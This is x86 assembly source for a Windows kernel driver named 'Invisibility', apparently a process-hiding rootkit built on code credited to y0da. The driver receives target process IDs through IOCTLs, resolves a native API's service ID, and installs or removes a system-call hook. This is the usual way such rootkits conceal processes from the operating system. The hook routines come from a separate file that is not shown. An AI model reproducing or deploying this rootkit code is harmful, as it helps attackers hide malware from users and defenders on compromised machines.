;  Invisibility - Kernel Mode Driver - Base code by y0da and heavily, heavily modified
  

.386
.model flat, stdcall
option casemap:none


include ..\include\ntstatus.inc
include ..\include\ntddk.inc
include ..\include\ntoskrnl.inc
include ..\include\w2kundoc.inc
include ..\macros\Strings.mac


includelib  ..\lib\wdm.lib
includelib  ..\lib\ntoskrnl.lib
includelib  ..\lib\ntdll.lib


include data.inc
include ..\common.inc

;------------CODE------------------------------------------------------------------------
.code
assume fs : nothing
include procs.asm


DriverCreateClose proc pDeviceObject:PDEVICE_OBJECT, pIrp:PIRP

	; CreateFile was called, to get device handle
	; CloseHandle was called, to close device handle
	; In both cases we are in user process context here

	mov eax, pIrp
	assume eax:ptr _IRP
	mov [eax].IoStatus.Status, STATUS_SUCCESS
	and [eax].IoStatus.Information, 0
	assume eax:nothing

	fastcall IofCompleteRequest, pIrp, IO_NO_INCREMENT

	mov eax, STATUS_SUCCESS
	ret

DriverCreateClose endp

;
; Purpose:   Handle device IO requests
;
DriverDispatch proc uses esi edi ebx, pDriverObject:PDEVICE_OBJECT, pIrp:PIRP
local status:NTSTATUS
local dwBytesReturned:DWORD
    mov dwBytesReturned, 0
    ;int 3
    mov edi, pIrp
	assume edi:ptr _IRP

	IoGetCurrentIrpStackLocation edi
	mov esi, eax
	assume esi:ptr IO_STACK_LOCATION
	
	.if [esi].MajorFunction == IRP_MJ_DEVICE_CONTROL
		mov     eax, [esi].Parameters.DeviceIoControl.IoControlCode		; EAX = DeviceIoControl code	
		.if eax == IOC_GETAPIID
			mov eax, (_IRP PTR [edi]).AssociatedIrp.SystemBuffer              ; EAX -> in buffer
			push [eax]
			push [eax]
			pop pNQSI
			call NativeApiIdFromApiAddress
			mov dwNQSI_NT_ID, eax
			mov status, STATUS_SUCCESS
						
		.elseif eax == IOC_GETCURPID
			mov eax, (_IRP PTR [edi]).AssociatedIrp.SystemBuffer              ; EAX -> in buffer
			push dword ptr [eax]
			pop dwTargetPID
			.if TablePresent == 1
		        inc PIDCount
			    mov ecx, PIDCount
			    mov ebx, pPIDTable
			    mov edx, dwTargetPID
			    mov word ptr [ebx+ecx*2], dx                            ; sinon on ajoute dans notre table de PIDs, le PID actuel...
			.else
	            push 2000h
	            push 0
	            call ExAllocatePool
                mov pPIDTable, eax
                mov edx, dwTargetPID
                mov word ptr [eax], dx
                mov PIDCount,0
                mov TablePresent, 1
            .endif
            mov status, STATUS_SUCCESS
            
        .ELSEIF eax == IOC_KILL
            mov edi, pIrp
            assume edi : PTR _IRP
            push dword ptr [edi].UserBuffer
            pop eax
            assume edi : NOTHING
            mov ecx, PIDCount
			mov ebx, pPIDTable
			xor edx, edx
			movzx edx, word ptr [ebx+ecx*2]
            push edx
            pop dword ptr [eax]
            mov status, STATUS_SUCCESS
            
		.elseif eax == IOC_HOOK
		    .if IsHooked != 1
		        call EstablishHook
			    mov IsHooked, 1
		    .endif
		    mov status, STATUS_SUCCESS
		    
		.ELSEIF eax == IOC_UNHOOK
		    .if IsHooked != 0
		        call UnhookSystem
	            mov IsHooked, 0
            .endif
            mov status, STATUS_SUCCESS
		.endif
	.endif
	assume  esi : NOTHING
	fastcall IofCompleteRequest, pIrp, IO_NO_INCREMENT
	mov     eax, status
	ret
DriverDispatch endp

DriverUnload PROC USES EBX ESI EDI, DriverObject:PDRIVER_OBJECT

;int 3

	cmp IsHooked, 0
	jz @F
	call UnhookSystem
	mov IsHooked, 0
@@:
	invoke ExFreePool,pPIDTable
	mov PIDCount,0
	mov TablePresent,0
	; cleanup
	invoke  IoDeleteSymbolicLink, ADDR szSymPath
	mov eax, DriverObject
	invoke  IoDeleteDevice,(DRIVER_OBJECT PTR [eax]).DeviceObject
	ret
DriverUnload endp

.code
DriverEntry proc DriverObject:PDRIVER_OBJECT, RegPath:PUNICODE_STRING
LOCAL   status    : NTSTATUS

	mov status, STATUS_DEVICE_CONFIGURATION_ERROR
	;int 3
	; create device/symbolic link
	invoke  IoCreateDevice, DriverObject, 0,addr szDevPath, FILE_DEVICE_UNKNOWN, 0, FALSE,addr pDevObj
	.if eax == STATUS_SUCCESS
	    invoke  IoCreateSymbolicLink, addr szSymPath,addr szDevPath
	    .if eax == STATUS_SUCCESS
	        ; setup DriverObject
	        mov     esi, DriverObject
	        assume  esi : PTR DRIVER_OBJECT
	        mov [esi].DriverUnload,											OFFSET DriverUnload
	        mov [esi].MajorFunction[IRP_MJ_CREATE*(sizeof PVOID)],			OFFSET DriverCreateClose
	        mov [esi].MajorFunction[IRP_MJ_CLOSE*(sizeof PVOID)],			OFFSET DriverCreateClose
	        mov [esi].MajorFunction[IRP_MJ_DEVICE_CONTROL*(sizeof PVOID)],	OFFSET DriverDispatch
	        assume  esi : NOTHING
	        mov     status, STATUS_SUCCESS
	    .else
	        invoke IoDeleteDevice, pDevObj
	    .endif
	.endif
	mov eax, status
	ret
	
DriverEntry endp


End DriverEntry
